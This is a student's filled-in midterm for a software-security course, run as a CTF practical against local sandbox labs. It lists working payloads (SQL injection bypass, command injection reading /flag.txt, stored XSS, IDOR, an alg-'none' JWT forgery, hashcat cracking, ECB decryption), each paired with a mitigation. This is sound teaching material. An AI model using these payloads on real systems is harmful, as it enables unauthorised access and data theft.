# Midterm — Hands-on CTF Practical (Week 9)

**Course:** Software Security (KOSEN69) · **Covers:** Weeks 1–6
**Time:** 150 min · **Total:** 100 pts · **Individual** · Sandbox targets only (ethics policy applies).

**Name:** Gritthaphat Intaraprasit   **Student ID:** 6631503001

> Each challenge yields a **flag** in the form `FLAG{...}` (or the proof noted). Submit, per challenge: the **flag**, the **payload/command** you used, and a **one-line mitigation**. Partial credit for documented progress without the flag.

![A CTF scoreboard diagram showing the Week 9 midterm practical's four graded categories, their point weights, source labs, the mechanism each flag actually tests, and their link to the Week 8 written exam sections.](img/ctf-categories.svg)

**Targets (started by the instructor):**
- Injection / Auth: `labs/week04-injection` and `labs/week06-authn-authz` apps (`docker compose up`)
- XSS: `labs/week05-xss-client-side` app
- Crypto: `labs/week03-cryptography` (`hashes.txt`, the ECB oracle)

---

## Challenges

| # | Title | Topic | Pts |
|---|-------|-------|-----|
| 1 | **Boolean Bypass** — log in as `admin` without the password | SQLi (W4) | 15 |
| 2 | **Shell Out** — read a file via the `host` parameter | Command injection (W4) | 15 |
| 3 | **Pop the Alert** — fire `alert(document.domain)` stored for another user | Stored XSS (W5) | 15 |
| 4 | **Not Your Order** — read another user's order object | IDOR (W6) | 15 |
| 5 | **Forge Ahead** — become admin with a forged JWT | Broken JWT (W6) | 15 |
| 6 | **Crack It** — recover a password from a weak hash | Crypto (W3) | 15 |
| 7 | **Penguin** — recover the plaintext structure from the ECB oracle | Crypto (W3) | 10 |

**Submission table (fill in):**

| # | Flag / proof | Payload or command | Mitigation (1 line) |
|---|---|---|---|
| 1 |![proof_1](1-6631503001.png) | http://localhost:8080/login?user=admin%27--%20&pw=| Parameterise the query and bind the input as a value instead of concatenating it|
| 2 |FLAG{cmdi_demo} ![alt text](2-6631503001.png) |http://localhost:8080/ping?host=127.0.0.1;cat%20/flag.txt |Never hand input to a shell: run the binary with an argument array and shell=False (subprocess.run(["ping","-c","1",host])) and allow-list the hostname, so ; is inert |
| 3 |![alt text](3-6631503001.png) | curl -X POST http://localhost:8080/comments --data-urlencode "body=<.script>alert(document.domain)</.script>"| Encode the comment in the context it's rendered in (Jinja autoescape / markupsafe.escape) so the tag arrives as text, plus HttpOnly cookies and CSP script-src 'self' as backup.|
| 4 |FLAG{idor_demo}![alt text](4-6631503001.png)|curl.exe -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer (token)" | Check ownership server-side on every object access, deny by default (if order["owner"] != current_user(): return 403) instead of trusting the id from the client.|
| 5 |FLAG{jwt_demo}![alt text](5-6631503001.png) | import jwt;print(jwt.encode({'sub':'admin'}, '', algorithm='none'))" then C:\Users\Asus>curl.exe -s http://localhost:8080/api/admin -H "Authorization: Bearer "forged JWT token"|Verify the signature with a pinned algorithm and a strong random secret from env, require exp/aud/iss, reject alg:none, and authorise from server-side data not from a token claim. |
| 6 | ![alt text](6-6631503001.png)|hashcat.exe -m 0 "C:\Users\Asus\AppData\Local\Temp\wk03crack\hashes.txt" "D:\Study\software-security\labs\week03-cryptography\rockyou.txt", *then* hashcat.exe -m 0 "C:\Users\Asus\AppData\Local\Temp\wk03crack\hashes.txt" --show |Store passwords with a salted slow KDF (argon2id) at a tuned cost factor with a rehash-on-login migration, plus rate limiting, so each guess costs ~100 ms instead of microseconds |
| 7 |3bfd04cc0d7ed55358e2cbe19de21383,AAAAAAAAAAAAAAAA ![alt text](7-6631503001.png)|C:\Users\Asus\AppData\Local\Programs\Python\Python311\python.exe" -c "from Crypto.Cipher import AES;import sys;d=AES.new(b'0123456789abcdef',AES.MODE_ECB).decrypt(bytes.fromhex(sys.argv[1]));p=d[-1] if 0<d[-1]<=16 else 0;print('raw:',d);print('plaintext:',d[:-p] if p else d)" "3bfd04cc0d7ed55358e2cbe19de213833bfd04cc0d7ed55358e2cbe19de21383377222e061a924c591cd9c27ea163ed4 | Replace ECB with an authenticated mode using a random per-message nonce (AES-GCM: 12-byte nonce + auth tag) so equal plaintext blocks never repeat in the ciphertext and tampering fails the tag check.|

---

*Rules:* no collaboration; attack only the provided targets; document your steps. Pairs with the Week 8 written midterm.
